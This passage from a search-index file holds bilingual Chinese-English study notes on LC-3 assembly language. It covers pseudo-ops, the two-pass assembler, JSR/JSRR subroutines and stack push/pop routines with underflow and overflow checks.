\u76ee\u7684\u5728\u4e8e\u8ba9\u591a\u4eba\u53c2\u4e0e\u540c\u4e00\u4e2a\u590d\u6742\u95ee\u9898\u7684\u89e3\u51b3\uff0c\u9700\u8981\u628a\u590d\u6742\u95ee\u9898\u7cfb\u7edf\u5730\u5206\u89e3\u4e3a\u4e00\u4e2a\u4e2a\u5355\u5143\uff0c\u8981\u6c42\u8fd9\u4e9b\u5c0f\u5355\u5143\u53ef\u4ee5\u88ab\u72ec\u7acb\u7f16\u7a0b\u5b9e\u73b0\u548c\u8fd0\u884c\uff0c\u5e76\u4e14\u72ec\u7acb\u68c0\u9a8c\u5176\u6b63\u786e\u6027\uff0cwe called it sysem decomposition</p> <p>the three constructs: sequential, conditional, lterative (\u987a\u5e8f\uff0c\u6761\u4ef6\uff0c\u5faa\u73af)</p> <p>\u8981\u628a\u4e00\u4e2a\u4efb\u52a1\u5206\u89e3\u6210\u591a\u4e2a\u5b50\u4efb\u52a1\uff0c\u8fd9\u4e9b\u5b50\u4efb\u52a1\u4e00\u822c\u662f\u57fa\u4e8e\u67d0\u4e9b\u7ed3\u6784\u7ec4\u5408\u5728\u4e00\u8d77\u5f62\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u5927\u4efb\u52a1\uff0c\u8fd9\u79cd\u7ed3\u6784\u4e00\u822c\u6709\u8fd9\u4e09\u79cd</p> <p>\u4ee5LC-3\u7684\u673a\u5668\u7801\u4e3a\u4f8b\uff0c\u6765\u8bf4\u660e\u8fd9\u4e09\u79cd\u4f8b\u5b50</p> <p>\u200b\u200b</p> <p>\u4ee5\u4e0a\u5c31\u662f\u4e09\u79cd\u7ed3\u6784\u7684\u56fe\u50cf\u5316\u8868\u793a\u65b9\u5f0f</p> <p>the character count example</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#debugging","title":"debugging","text":"<p>A good way to debug is to trace your program. This consists of keeping track of the sequence of instructions that have been executed and the results produced by each instruction. \u4e00\u4e2a\u597d\u7684\u65b9\u6cd5\u5c31\u662f\u53bb\u8ffd\u8e2a\u4f60\u7684\u7a0b\u5e8f\uff0c\u987a\u5e8f\u6267\u884c\u6bcf\u4e00\u6b65\uff0c\u770b\u6bcf\u4e00\u6b65\u7684\u7ed3\u679c</p> <p>\u4e4b\u524d\u6211\u4eec\u63d0\u5230\u4e86\u6a21\u5757\u5316\u7684\u7f16\u7a0b\uff0c\u6a21\u5757\u5316\u7684\u8bbe\u8ba1\u4e5f\u66f4\u52a0\u5229\u4e8e\u6211\u4eec\u8fdb\u884c\u8c03\u8bd5\uff0c\u5bf9\u6bcf\u4e2a\u6a21\u5757\u7684\u8f93\u51fa\u7ed3\u679c\u8fdb\u884c\u68c0\u67e5\uff0c\u6709\u5229\u4e8e\u6211\u4eec\u8fc5\u901f\u5b9a\u4f4d\u95ee\u9898\u6240\u5728</p> <p>debugging operations</p> <p>\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u6709\u4e86\u5f88\u591a\u6210\u719f\u7684\u8c03\u8bd5\u5de5\u5177\uff0c\u572815\u7ae0\u4e2d\u5c06\u5b66\u4e60dbx\uff0c\u4e00\u4e2ac\u8bed\u8a00\u6e90\u7801\u7ea7\u8c03\u8bd5\u5668 \u6211\u4eec\u73b0\u5728\u505c\u7559\u5728\u673a\u5668\u8bed\u8a00\u5c42\u9762\uff0c\u4f46\u662f\u4ecd\u7136\u80fd\u505a\u4e00\u4e9b\u7b80\u5355\u7684interactive bebugging operation</p> <p>LC-3\u7684\u6a21\u62df\u5668\u80fd\u505a\u5f88\u591a\u7684\u6709\u5229\u4e8e\u8c03\u8bd5\u7684\u5de5\u4f5c\uff0c \u5305\u62ec\u5bf9\u5185\u5b58\u5355\u5143\u548c\u5bc4\u5b58\u5668\u8fdb\u884c\u8d4b\u503c\uff0c \u6267\u884c\u6307\u4ee4\uff0c \u4efb\u610f\u65f6\u523b\u7ec8\u6b62\u6307\u4ee4\u6267\u884c\uff0c \u5728\u4efb\u610f\u6267\u884c\u6b65\u9aa4\u4e2d\u67e5\u770b\u5185\u5b58\u548c\u5bc4\u5b58\u5668\u7684\u5185\u5bb9</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-7-assembly-language","title":"chapter 7 assembly language","text":"<p>assembly language programming---moving up a level</p> <p>\u4ece\u5e7f\u4e49\u7684\u673a\u5668\u8bed\u8a00\u6765\u8bb2\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u9ad8\u7ea7\u7684\u673a\u5668\u8bed\u8a00like C, C++, java and so on. \u4e00\u79cd\u662f\u4f4e\u7ea7\u8bed\u8a00\uff0c\u4e00\u822c\u6765\u8bf4\u9ad8\u7ea7\u8bed\u8a00\u4e0d\u53d7\u673a\u5668\u7684ISA\u5f71\u54cdISA independent\uff0c\u4f46\u662f\u4f4e\u7ea7\u8bed\u8a00\u662fISA\u76f8\u5173\u7684ISA dependent</p> <p>\u9ad8\u7ea7\u8bed\u8a00\u7684\u7a0b\u5e8f\u5728\u8fd0\u884c\u4e4b\u524d\uff0c\u5fc5\u987b\u88ab\u8f6c\u6362\u6210\u7279\u5b9a\u7684ISA\u673a\u5668\u8bed\u8a00\u683c\u5f0f\u7684\u4ee3\u7801</p> <p>\u6c47\u7f16\u8bed\u8a00\u65e8\u5728\u8ba9\u673a\u5668\u5e95\u5c42\u8bed\u8a00\u7684\u7f16\u7a0b\u8fc7\u7a0b\u66f4\u52a0\u53cb\u597d \u5b83\u7528mnemonic\u52a9\u8bb0\u7b26\u6765\u66ff\u4ee3opcode\u64cd\u4f5c\u7801 \u7528symbolic name\u7b26\u53f7\u540d\u6765\u66ff\u4ee3\u5185\u5b58\u5730\u5740</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#one-example-of-assembly-language-program","title":"one example of assembly language program","text":"<p>\u200b\u200b</p> <p>\u4e0a\u56fe\u4e3a\u4e00\u4e2a\u6c47\u7f16\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u7684\u662f\u5c06\u5b58\u653e\u5728NUMBER\u7684\u6574\u6570\u4e58\u4ee5\u516d \u8be5\u6c47\u7f16\u7a0b\u5e8f\u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\uff0c\u6ce8\u91ca\uff0c\u6307\u4ee4\uff0c\u4f2a\u64cd\u4f5c\uff08pseudo-ops\uff09 \u6c47\u7f16\u8bed\u8a00\u7684\u7ffb\u8bd1\u7a0b\u5e8f\u88ab\u79f0\u4e3a\u6c47\u7f16\u5668assembler\uff0c\u7ffb\u8bd1\u8fc7\u7a0b\u79f0\u4e3a\u6c47\u7f16assembly \u6ce8\u91ca\u548c\u673a\u5668\u7801\u4e00\u6837\u7528\uff1b\u8868\u793a\u4e00\u884c\u4e3a\u6ce8\u91ca</p> <p>\u6307\u4ee4</p> <p>\u4e0e\u673a\u5668\u6307\u4ee4\u4e0d\u540c\u7684\u662f\uff0c\u6c47\u7f16\u8bed\u8a00\u7684\u6307\u4ee4\u683c\u5f0f\u5305\u542b\u56db\u4e2a\u90e8\u5206 LABEL OPCODE OPERAND \uff1bCOMMENTS</p> <p>\u6211\u4eec\u7528R0\u5230R7\u8868\u793a\u516b\u4e2a\u901a\u7528\u5bc4\u5b58\u5668</p> <p>\u5176\u4e2dopcode\u548coperand\u662f\u5fc5\u987b\u7684  </p> <p>opcode\u4e0eLC-3\u6307\u4ee4\u4e2d\u7684opcode\u76f8\u5bf9\u5e94\uff0c\u7528\u5b57\u7b26\u4e32\u8868\u793a\uff0c\u4f8b\u5982ADD\u8868\u793a0001</p> <p>operand\u64cd\u4f5c\u6570\u4e2a\u6570\u53d6\u51b3\u4e8e\u5404\u4e2a\u6307\u4ee4\u672c\u8eab\uff0c\u4f8b\u5982 AGAIN ADD R3,R3,R2;\u5c06R2\u548cR3\u7684\u5185\u5bb9\u76f8\u52a0\u5b58\u50a8\u5230R3\u4e2d LD R2,NUMBER ;LD\u6307\u4ee4\u9700\u8981\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0c\u8fd9\u91cc\u76f4\u63a5\u7528NUMBER\u6765\u8868\u793a\u5185\u5b58\u5730\u5740 AND R3,R3,#0 ; \u6e05\u7a7aR3</p> <p>\u7acb\u5373\u6570\u524d\u9762\u9700\u8981\u6709\u4e00\u4e2a\u6807\u8bc6\uff0c#\u8868\u793a\u5341\u8fdb\u5236 x \u8868\u793a\u5341\u516d\u8fdb\u5236 b \u8868\u793a\u4e8c\u8fdb\u5236</p> <p>label\u6807\u53f7\uff0c\u662f\u6307\u5411\u5185\u5b58\u5355\u5143\u7684\u4e00\u4e2a\u7b26\u53f7\u540d\uff0c\u5b83\u53ef\u4ee5\u5728\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u5f15\u7528 \u5728LC-3\u6c47\u7f16\u8bed\u8a00\u4e2d\uff0c\u6807\u53f7\u53ef\u4ee5\u662f\u5305\u542b1\u523020\u4e2a\u5b57\u7b26\uff08\u5927\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57\uff0c\u4f46\u662f\u9996\u5b57\u7b26\u5fc5\u987b\u662f\u5b57\u6bcd\uff09</p> <p>\u4f7f\u7528\u6807\u53f7\u663e\u793a\u8bbf\u95ee\u5185\u5b58\u7684\u60c5\u51b5\u6709\u4e24\u79cd \u4e00\u4e2a\u662f\u8be5\u5355\u5143\u7684\u5185\u5bb9\u662f\u6307\u4ee4\uff0c\u8be5\u5355\u5143\u5730\u5740\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u76ee\u6807 \u4e00\u4e2a\u662f\u8be5\u5355\u5143\u7684\u5185\u5bb9\u662fload\u6216\u8005store\u8bbf\u95ee\u7684\u6570\u503c</p> <p>\u4f8b\u5982AGAIN ADD R2,R2,R3 ..... BRp AGAIN; \u5982\u679c\u524d\u4e00\u6761\u6307\u4ee4\u7ed3\u679c\u4e3a0\uff0c\u5219\u8df3\u8f6c\u5230\u524d\u9762\u7684AGAIN</p> <p>pseudo-ops\u4f2a\u64cd\u4f5c</p> <p>\u7528\u4e8e\u8f85\u52a9\u6c47\u7f16\u5668\u628a\u6c47\u7f16\u4ee3\u7801\u8f6c\u5316\u4e3a\u673a\u5668\u7801\u7684\u8fc7\u7a0b</p> <p>\u4f2a\u64cd\u4f5c\u4e5f\u79f0\u4e3a\u6c47\u7f16\u6307\u4ee4assembler directive \u6240\u6709\u7684\u4f2a\u64cd\u4f5c\u524d\u9762\u90fd\u6709\u4e00\u4e2a \u201d. \u201c</p> <p>LC-3\u7684\u4f2a\u64cd\u4f5c\u6709\u4e94\u79cd \uff1a .ORIG .FILL .BLKW .STRINGZ .END</p> <p>.ORIG \u8868\u793a\u628a\u8be5LC-3\u7a0b\u5e8f\u653e\u5230\u4ec0\u4e48\u5730\u65b9\uff0c\u4f8b\u5982 .ORIG x3050 \u5c31\u662f\u8ba9\u8fd9\u4e00\u6bb5\u7a0b\u5e8f\u4ecex3050\u5f00\u59cb</p> <p>.FILL \u544a\u8bc9\u6c47\u7f16\u5668\u5360\u7528\u4e0b\u4e00\u4e2a\u5730\u5740\u5e76\u4e14\u586b\u5145\u5176\u521d\u59cb\u503c\uff0c\u4f8b\u5982 SIX .FILL x0006 \u5c06\u8fd9\u4e2a\u5730\u5740\u586b\u5145\u4e3a6\uff0c\u5e76\u4e14\u628a\u8fd9\u5757\u5730\u5740\u547d\u540d\u6210SIX</p> <p>.BLKW \u544a\u8bc9\u6c47\u7f16\u5668\u8981\u5f00\u59cb\u5360\u7528\u4e00\u8fde\u4e32\u8fde\u7eed\u7684\u5730\u5740\u7a7a\u95f4 NUMBER .BLKW 1 ; \u8868\u793a\u8981\u5360\u7528\u4e00\u57571\u4e2a\u5355\u4f4d\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5c06\u5176\u547d\u540d\u4e3aNUMBER \u4e0eFILL\u4e0d\u540c\u7684\u662f BLKW\u9002\u7528\u4e8e\u6570\u503c\u6682\u65f6\u4e0d\u786e\u5b9a\u7684\u60c5\u51b5\uff0c\u6bd4\u5982\u8bf4\u7528\u4e8e\u5b58\u50a8\u952e\u76d8\u8f93\u5165\u503c</p> <p>.STRINGZ \u662f\u8fde\u7eed\u5360\u7528\u5e76\u521d\u59cb\u5316n+1\u4e2a\u5185\u5b58\u5355\u5143 \u5176\u4f7f\u7528\u65b9\u5f0f\u4e00\u822c\u9488\u5bf9\u5b57\u7b26\u4e32\u7684\u5904\u7406\uff0c\u6bcf\u4e00\u4e2a\u5355\u5143\u83b7\u5f97\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e2d\u4e00\u4e2a\u5b57\u7b26\u7684ASCII\u7801\u76840\u62d3\u5c55 \u4f8b\u5982        .ORIG x3100 HELLO .STRINGZ \"Hello,world\"</p> <p>\u4ecex3100\u5230x310D\u7684\u7a7a\u95f4\u90fd\u4f1a\u88ab\u5360\u7528\u5e76\u7528\u6bcf\u4e2a\u5b57\u7b26\u7684ASCII\u76840\u62d3\u5c55\u8d4b\u503c \u7279\u522b\u6ce8\u610f\u7684\u662f\u88ab\u5360\u7528\u7684\u7a7a\u95f4\u4f1a\u591a\u4e00\u4f4d\uff0c\u6700\u540e\u4e00\u4f4d\u88ab\u56fa\u5b9a\u8d4b\u503c\u4e3ax0000 \u8fd9\u662f\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528\u54e8\u5175\u673a\u5236</p> <p>.END \u7528\u4e8e\u544a\u8bc9\u6c47\u7f16\u5668\u7a0b\u5e8f\u7ed3\u675f\u4e86\uff0c\u6c47\u7f16\u5668\u4f1a\u65e0\u89c6END\u540e\u7684\u6240\u6709\u5185\u5bb9</p> <p>\u4f2a\u64cd\u4f5c\u4e4b\u6240\u4ee5\u79f0\u4e3a\u4f2a\u64cd\u4f5c\uff0c\u662f\u56e0\u4e3a\u5728\u6c47\u7f16\u5b8c\u6210\u4e4b\u540e\uff0c\u5b83\u4eec\u4e0d\u51fa\u73b0\u5728\u5b9e\u9645\u7684\u673a\u5668\u7801\u6307\u4ee4\u4e2d</p> <p>\u7814\u4e60\u4f8b\u5b50\uff0c\u770b\u8bfe\u7a0b</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#the-assembly-process","title":"the assembly process","text":"<p>\u6c47\u7f16\u8fc7\u7a0b\u5305\u62ec\u4e24\u904d\u626b\u63cf\uff0c\u7b2c\u4e00\u904d\u6784\u5efa\u7b26\u53f7\u8868\uff0c\u7b26\u53f7\u548c16\u4f4d\u5730\u5740\u4e4b\u95f4\u7684\u4e00\u4e00\u5bf9\u5e94 \u7b2c\u4e8c\u904d\u8d1f\u8d23\u628a\u6240\u6709\u6c47\u7f16\u6307\u4ee4\u7ffb\u8bd1\u6210\u5bf9\u5e94\u7684\u673a\u5668\u6307\u4ee4</p> <p>\u53ef\u6267\u884c\u5370\u8c61\u548c\u591a\u76ee\u6807\u6587\u4ef6\u7f16\u7a0b</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-8-data-structure","title":"chapter 8 data structure*","text":"<p>\u6211\u4eec\u4f1a\u5b66\u4e60\u4e09\u79cd\u62bd\u8c61\u6570\u636e\u7c7b\u578bstacks, queues, character srings</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#subroutines","title":"subroutines \u5b50\u7a0b\u5e8f","text":"<p>\u5982\u679c\u7a0b\u5e8f\u7684\u67d0\u4e00\u6bb5\u88ab\u53cd\u590d\u5730\u4f7f\u7528\u5e76\u4e14\u5e0c\u671b\u5176\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u88ab\u8c03\u7528\u4e86 \u4e00\u79cd\u5178\u578b\u7684\u60c5\u51b5\u662f\uff0c\u7a0b\u5e8f\u5458\u8c03\u7528\u7684\u4ee3\u7801\u662f\u7b2c\u4e09\u65b9\u7684\u5e93libraries\uff0c\u4f8b\u5982math libraries \u91cc\u9762\u6709\u5404\u79cd\u6570\u5b66\u7684\u8ba1\u7b97\u51fd\u6570</p> <p>\u6211\u4eec\u628a\u8fd9\u4e9b\u9700\u8981\u590d\u7528\u7684\u4ee3\u7801\u6bb5\u79f0\u4e3asubroutines, procedures, or functions</p> <p>the call/return machanism</p> <p>\u5b50\u7a0b\u5e8f\u7684\u8c03\u7528\u4e3b\u8981\u4f9d\u9760JSR\u548cJMP\u6307\u4ee4\u5b9e\u73b0 \u7528JSR\u8df3\u8f6c\u5230\u5b50\u7a0b\u5e8f\uff0c\u7528JMP R7\u4e5f\u5373RET\u8fd4\u56de\u539f\u7a0b\u5e8f</p> <p>\u9700\u8981\u8ba1\u7b97\u5b50\u7a0b\u5e8f\u7684\u5f00\u59cb\u5730\u5740\uff0c\u5e76\u5c06\u5176\u88c5\u5165PC\uff0c\u4fdd\u5b58\u8c03\u7528\u8fd4\u56de\u5730\u5740\u503c\uff0c\u518d\u5c06\u5176\u88c5\u5165PC</p> <p>JSR/JSRR\u6307\u4ee4 0100</p> <p>\u8be5\u6307\u4ee4\u5b8c\u6210\u4e24\u4ef6\u4e8b\uff0c\u5148\u5c06\u8fd4\u56de\u5730\u5740\u5b58\u5165R7\uff0c\u518d\u5c06\u5b50\u7a0b\u5e8f\u7684\u8d77\u59cb\u5730\u5740\u4f20\u5165PC\uff08PC\u662f\u8df3\u8f6c\u540e\u5df2\u7ecf\u9012\u589e\u7684\u503c\uff09\u4f1a\u628a\u8ba1\u7b97\u5b8c\u7684\u5730\u5740\u5b58\u5165PC\uff0c\u7136\u540e\u628aJSR\u6307\u4ee4\u539f\u672c\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684PC\u4f20\u5165R7</p> <p>JSR\u548cJSRR\u6307\u4ee4\u7684\u64cd\u4f5c\u7b26\u76f8\u540c\uff0c\u53ea\u662f\u5bfb\u5740\u6a21\u5f0f\u4e0d\u540c\uff0c\u6839\u636e11\u4f4d\u8fdb\u884c\u5224\u65ad\uff0c\u5982\u679c\u662f11\u4f4d\u4e3a1\u5c31\u662fPC\u76f8\u5bf9\u5bfb\u5740JSR\uff0c\u5982\u679c\u662f11\u4f4d\u4e3a0\uff0c\u5c31\u662f\u57fa\u5730\u5740\u5bfb\u5740JSRR  </p> <p>JSR\uff1aopcode A address evaluation bits 0100 1 10000000100 \u5047\u8bbe\u6b64\u65f6JSR\u5728x4200\uff0c\u90a3\u4e48PC\u4e3ax3E05, R7\u4e3ax4201</p> <p>JSRR: 101\u4e3a\u5bc4\u5b58\u5668 0100 0 00 101 000000 \u5047\u8bbe\u6b64\u65f6JSRR\u7684\u6307\u4ee4\u6240\u5728\u5730\u5740\u4e3ax420A\uff0cR5\u7684\u5185\u5bb9\u4e3ax3002\uff0c\u90a3\u4e48PC\u4e3ax3002\uff0cR7\u4e3ax420B</p> <p>saving and restoring registers</p> <p>\u6211\u4eec\u5e0c\u671b\u5b50\u7a0b\u5e8f\u7684\u5f00\u53d1\u548c\u6211\u4eec\u7684\u4f7f\u7528\u662f\u65e0\u5173\u7684\uff0c\u6211\u4eec\u4e0d\u80fd\u544a\u8bc9\u5b50\u7a0b\u5e8f\u54ea\u51e0\u4e2a\u5bc4\u5b58\u5668\u91cc\u7684\u6570\u636e\u662f\u4f60\u4e0d\u80fd\u4f7f\u7528\u7684\uff0c\u56e0\u4e3a\u5728\u5404\u4e2a\u60c5\u51b5\u4e0b\u5404\u6709\u4e0d\u540c\uff0c\u6240\u4ee5\u597d\u7684\u65b9\u6cd5\u662f\u8fdb\u5165\u5b50\u7a0b\u5e8f\u4e4b\u524d\uff0c\u628a\u4e4b\u524d\u6211\u4eec\u7a0b\u5e8f\u91cc\u662f\u9700\u8981\u7684\u5bc4\u5b58\u5668\u6570\u636e\u4fdd\u5b58\u8d77\u6765\uff1f</p> <p>\u5728\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u4f1a\u5e0c\u671b.BLKW\u4e00\u4e9b\u7a7a\u95f4\uff0c\u8ba9\u6211\u4eec\u7528\u6765\u4fdd\u5b58\u6211\u4eec\u7684\u5bc4\u5b58\u5668\u6570\u636e\uff0c\u7136\u540e\u5728\u5b50\u7a0b\u5e8f\u8fd4\u56de\u8c03\u7528\u7a0b\u5e8f\u7684\u65f6\u5019\uff0c\u628a\u90a3\u4e9b\u6570\u636e\u8fd4\u56de\u8fc7\u6765</p> <p>\u8fd9\u4e2a\u4fdd\u5b58\u5de5\u4f5c\u65e2\u53ef\u4ee5\u6709\u5b50\u7a0b\u5e8f\u6765\u505a\u4e5f\u53ef\u4ee5\u5728\u8c03\u7528\u7684\u5730\u65b9\u505a  \u5206\u522b\u8bb0\u4e3acaller save(\u8c03\u7528\u7684\u5730\u65b9) and callee save(\u5b50\u7a0b\u5e8f) \u5bf9\u4e8e\u5b50\u7a0b\u5e8f\u800c\u8a00\uff0c\u5b83\u77e5\u9053\u5b83\u9700\u8981\u4f7f\u7528\u90a3\u4e9b\u5bc4\u5b58\u5668\uff0c\u5c31\u5148\u628a\u5b83\u4eec\u7684\u503c\u7ed9\u5b58\u8d77\u6765\uff1b \u5bf9\u4e8e\u8c03\u7528\u5b83\u7684\u6e90\u7a0b\u5e8f\u800c\u8a00\uff0c\u5b83\u77e5\u9053\u54ea\u4e9b\u5bc4\u5b58\u5668\u4f1a\u88ab\u4f7f\u7528\uff0c\u5c06\u5b83\u4eec\u4fdd\u5b58\u8d77\u6765</p> <p>library routines</p> <p>they are legitimately advertised as productivity enhancers since they allow the user to use them without knowing their inner details. \u4f8b\u5982sqrt\u6c42\u5e73\u65b9\u6839\u51fd\u6570</p> <p>\u200b\u200b</p> <p>\u5982\u56fe\u662f\u4e00\u4e2a\u5e93\u51fd\u6570sqrt\u7684\u4f7f\u7528\u793a\u4f8b\uff0c\u8fd9\u4e2a\u5e93\u51fd\u6570\u9488\u5bf9\u5bc4\u5b58\u5668R0\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#the-stack","title":"the stack","text":"<p>\u6808\u662f\u4e00\u79cd\u62bd\u8c61\u6570\u636e\u7c7b\u578b\uff0c\u6808\u7684\u5b9a\u4e49\u65f6\u6700\u540e\u5b58\u5165\u7684\u4e1c\u897f\u4e00\u5b9a\u662f\u7b2c\u4e00\u4e2a\u88ab\u79fb\u9664\u7684 LIFO \u62bd\u8c61\u6570\u636e\u7c7b\u578b\u662f\u6307\u5b58\u50a8\u673a\u5236\u7684\u64cd\u4f5c\u65b9\u5f0f</p> <p>\u5bf9\u4e8e\u6808\u7684\u64cd\u4f5c\u6709\u7279\u5b9a\u7684\u672f\u8bedpop\uff0c\u662f\u6307\u5220\u9664\u5143\u7d20\uff1bpush\uff0c\u662f\u6307\u63d2\u5165\u5143\u7d20</p> <p>the implementation in memory \u5728\u5185\u5b58\u4e2d\u7684\u5b9e\u73b0</p> <p>\u6808\u5728\u5185\u5b58\u4e2d\u6700\u5e38\u89c1\u7684\u5b9e\u73b0\u65b9\u5f0f\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\u548c\u4e00\u4e2a\u6808\u6307\u9488\uff08stack pointer\uff09\uff0c\u6808\u6307\u9488\u6765\u6307\u5411\u6808\u7684\u9876\u90e8\uff0c\u51fa\u6808\u548c\u5165\u6808\u5176\u4ed6\u5143\u7d20\u65e0\u9700\u79fb\u52a8</p> <p>\u200b\u200b</p> <p>\u8fd9\u662f\u6808\u5728\u5185\u5b58\u4e2d\u64cd\u4f5c\u7684\u4e00\u4e2a\u5177\u8c61\u5316\u56fe\u7247\uff0cR6\u5bc4\u5b58\u5668\u8868\u793a\u6808\u6307\u9488\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\uff0c5,12\u4e24\u4e2a\u5143\u7d20\u867d\u7136\u5df2\u7ecf\u51fa\u6808\u4e86\uff0c\u4f46\u662f\u5b83\u4eec\u8fd8\u662f\u5728\u5185\u5b58x3FFD\u548cx3FFC\u4e0a\uff0c\u4f46\u662f\u7531\u4e8e\u8fd9\u4e00\u6bb5\u5185\u5b58\u53ea\u80fd\u7531\u6808\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\uff0c\u6240\u4ee5\u89c6\u4f5c\u5b83\u4eec\u5df2\u7ecf\u51fa\u6808\u4e86\uff0c\u662f\u901a\u8fc7\u673a\u5236\u79fb\u9664\u800c\u4e0d\u662f\u7269\u7406\u610f\u4e49\u4e0a\u7684\u79fb\u9664</p> <p>push</p> <pre><code>PUSH    ADD   R6,R6,#-1 \n    STR   R0,R6,#0\n</code></pre> <p>\u6bcf\u4e00\u6b21\u538b\u5165\u64cd\u4f5c\uff0c\u6808\u6307\u9488\u5148\u9012\u51cf\uff0c\u7136\u540e\u518d\u628a\u6570\u636e\u5b58\u5165\u5176\u5730\u5740</p> <p>pop</p> <pre><code>POP     LDR   R0,R6,#0\n    ADD   R6,R6,#1\n</code></pre> <p>\u6808\u9876\u7684\u5143\u7d20\u88ab\u5f39\u51fa\uff0c\u5e76\u4e14\u88ab\u8bfb\u5165R0\uff0cR6\u6808\u6307\u9488\u52a0\u4e00\uff0c\u4f46\u662f\u90a3\u4e24\u4e2a\u5143\u7d20\u5728\u7269\u7406\u610f\u4e49\u4e0a\u4ecd\u7136\u653e\u5728\u90a3\u5757\u5185\u5b58\u91cc\uff0c\u4f46\u662f\u53ea\u8981\u6211\u4eec\u5bf9\u8fd9\u4e00\u6bb5\u5185\u5b58\u9075\u5b88stack protocol\u6808\u534f\u8bae\uff0c\u5c31\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898</p> <p>underflow</p> <p>\u5982\u679c\u8fd9\u4e00\u6bb5\u5185\u5b58\u4e2d\u53ea\u6709\u4e24\u4e2a\u5143\u7d20\uff0c\u4f46\u662f\u6211\u505a\u4e86\u4e09\u6b21pop\u64cd\u4f5c\uff0c\u5c31\u4f1a\u53d1\u751f\u4e0b\u6ea2\u51fa\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u5bf9pop\u64cd\u4f5c\u8fdb\u884c\u4fee\u6539\uff0c\u4ee5R5\u5bc4\u5b58\u5668\u4f5c\u4e3a\u5224\u65ad\u6807\u51c6\uff0cpop\u662f\u5426\u6210\u529f\u4e86\u901a\u8fc7R5\u6765\u6807\u5fd7</p> <pre><code>POP     AND R5,R5,#0\n    LD R1,EMPTY\n    ADD R2,R6,R1\n    BRz Failure\n    LDR R0,R6,#0\n    ADD R6,R6,#1\n    RET\nFailure ADD R5,R5,#1\n    RET2\nEMPTY .FILL xC000 ; x4000\u53d6\u53cd\n</code></pre> <p>overflow</p> <p>\u540c\u6837\u7684\uff0c\u5728\u6808\u7a7a\u95f4\u5168\u90e8\u88ab\u5360\u7528\u7684\u60c5\u51b5\u4e0b\u53bb\u5f80\u6808\u91cc\u538b\u5165\u5143\u7d20\u4e5f\u4f1a\u51fa\u73b0\u95ee\u9898</p> <pre><code>PUSH    AND R5,R5,#0\n    LD R1,MAX\n    ADD R2,R6,R1\n    BRz Failure\n    ADD R6,R6,#-1\n    STR R0,R6,#0\n    RET\nFailure ADD R5,R5,#1\n    RET\nMAX     .FILL xC005 ; MAX &lt;-- -x3FFB\n</code></pre> <p>\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u5728\u8fd9\u79cd\u65b9\u6848\u4e0b\uff0c\u6808\u7a7a\u95f4\u7684\u64cd\u4f5c\u4f1a\u5360\u7528R1\uff0cR2\u548cR5\uff0c\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5728\u5b50\u7a0b\u5e8f\u5185\u90e8\u5bf9\u5176\u8fdb\u884c\u4fdd\u5b58 \u6700\u7ec8\u5b9e\u73b0\u7684\u4ee3\u7801\u89c1\u7b2c\u516b\u7ae017\u9875</p> <p>\u8fd9\u4e2a\u4ee3\u7801\u76f8\u5f53\u91cd\u8981\uff0c\u76f4\u63a5\u5c55\u793a\u4e86\u6574\u4e2a\u6570\u636e\u7ed3\u6784\u7684\u4e2d\u5fc3</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#character-strings","title":"character strings","text":"<p>\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4\uff0c\u91cc\u9762\u5b58\u653e\u7684\u6570\u636e\u6309\u7167ASCII\u8ba1\u7b97\uff0c\u4f8b\u5982x0042\uff0c\u7531\u4e8eascii\u53ea\u6709\u516b\u4f4d\uff0c\u6240\u4ee5\u5341\u516d\u8fdb\u5236\u524d\u4e24\u4f4d\u4e00\u5b9a\u662f0</p> 